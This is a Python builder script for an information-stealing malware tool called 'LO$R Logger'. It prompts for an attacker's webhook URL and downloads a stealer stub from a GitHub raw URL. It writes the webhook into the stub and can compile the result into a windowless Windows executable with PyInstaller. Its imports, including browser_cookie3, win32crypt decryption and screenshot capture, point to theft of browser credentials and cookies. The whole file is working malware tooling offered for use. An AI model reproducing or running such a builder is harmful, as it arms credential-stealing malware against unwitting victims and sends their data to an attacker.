import marshal
import zlib
import requests
from pystyle import *
import pygame
import os
import time
import pystyle
import random
import shutil
import os
import time
import json
import threading
import asyncio
import ntpath
import re
import sqlite3
import subprocess
import winreg
import zipfile
import httpx
import psutil
import base64
import ctypes
import pyperclip
import win32gui
import win32con

from sqlite3 import connect
from base64 import b64decode
from urllib.request import Request, urlopen
from shutil import copy2
from datetime import datetime, timedelta, timezone
from sys import argv
from tempfile import gettempdir, mkdtemp
from json import loads, dumps
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from Crypto.Cipher import AES
from PIL import ImageGrab
from win32crypt import CryptUnprotectData

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
author = "! LO$R#0001"

music_dir = "assets/music"

music_files = os.listdir(music_dir)

os.system(f'cls & title LO$R Logger Builder!')
banner = ("""
 /$$        /$$$$$$     /$$    /$$$$$$$        /$$                                                        
| $$       /$$__  $$  /$$$$$$ | $$__  $$      | $$                                                        
| $$      | $$  \ $$ /$$__  $$| $$  \ $$      | $$        /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$ 
| $$      | $$  | $$| $$  \__/| $$$$$$$/      | $$       /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$
| $$      | $$  | $$|  $$$$$$ | $$__  $$      | $$      | $$  \ $$| $$  \ $$| $$  \ $$| $$$$$$$$| $$  \__/
| $$      | $$  | $$ \____  $$| $$  \ $$      | $$      | $$  | $$| $$  | $$| $$  | $$| $$_____/| $$      
| $$$$$$$$|  $$$$$$/ /$$  \ $$| $$  | $$      | $$$$$$$$|  $$$$$$/|  $$$$$$$|  $$$$$$$|  $$$$$$$| $$      
|________/ \______/ |  $$$$$$/|__/  |__/      |________/ \______/  \____  $$ \____  $$ \_______/|__/      
                     \_  $$_/                                      /$$  \ $$ /$$  \ $$                    
                       \__/                                       |  $$$$$$/|  $$$$$$/                    
                                                                   \______/  \______/                                                                                                               
                                                                    made by ! LO$R#0001\n""")

print(Colorate.Vertical(Colors.purple_to_blue, banner, 2))

random_song = random.choice(os.listdir(music_dir))
current_song = random.choice(music_files)

pygame.mixer.init()
pygame.mixer.music.load(music_dir + "/" + current_song)
song_title = os.path.splitext(current_song)[0]

message = "Now Playing: {}".format(song_title)
print(Colorate.Vertical(Colors.purple_to_blue, message, 2))
pygame.mixer.music.play()


webhook = Write.Input("\nEnter webhook URL:", Colors.green_to_blue, interval=0.01)
r = requests.get(webhook)
if r.status_code == 200:
         Write.Print("Webhook Is Working\n",Colors.green_to_blue, interval=0.01) 
         time.sleep(1) 
else: 
    Write.Print("Webhook Isn't working\n",Colors.green_to_blue, interval=0.01) 
    time.sleep(3) 
    exit()
name = Write.Input("Enter File Name:", Colors.green_to_blue, interval=0.01)
stub = requests.get("https://raw.githubusercontent.com/madhead341/LOSR-Logger/main/stubs/stub.py")
with open(f"{name}.py", 'w', encoding='utf8') as f:
    f.write(stub.text.replace("webhooker", webhook))
Write.Print("LO$R Logger Was SucessFully Built\n",Colors.green_to_blue, interval=0.01)
exe = Write.Input("Complie To A Exe y/n:", Colors.green_to_blue, interval=0.01)
if exe == "y":
   os.system(f'pyinstaller --onefile --noconsole --hidden-import="requests" --hidden-import="discord" --hidden-import="browser_cookie3" --hidden-import="shutil" --hidden-import="base64" --hidden-import="win32crypt" --hidden-import="shutil" --hidden-import="sqlite3" --hidden-import="psutil" --hidden-import="colorama" {name}.py')
   os.remove(f'{name}.spec')
   Write.Print("LO$R Logger was sucessfully complied in dist folder\n",Colors.green_to_blue, interval=0.01) 
   time.sleep(2)
   Write.Print("Compiled to exe. Exiting...\n",Colors.green_to_blue, interval=0.01) 
   time.sleep(3)
   exit()
elif exe == "n":
   Write.Print("Not Compiled to exe. Exiting...\n",Colors.green_to_blue, interval=0.01) 
   time.sleep(3)
   while pygame.mixer.music.get_busy():
       exit()
